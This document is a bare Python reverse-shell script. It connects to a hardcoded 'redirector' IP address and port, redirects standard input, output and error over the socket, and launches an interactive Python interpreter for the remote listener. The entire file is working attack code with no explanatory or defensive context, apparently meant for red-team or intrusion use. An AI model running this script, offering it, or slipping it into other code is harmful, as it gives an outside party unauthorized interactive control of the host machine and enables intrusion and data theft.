import socket,subprocess,os
REDIRECTOR_IP = "10.65.107.242"
LISTENING_PORT = 33333
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((REDIRECTOR_IP,LISTENING_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["python3","-i"])
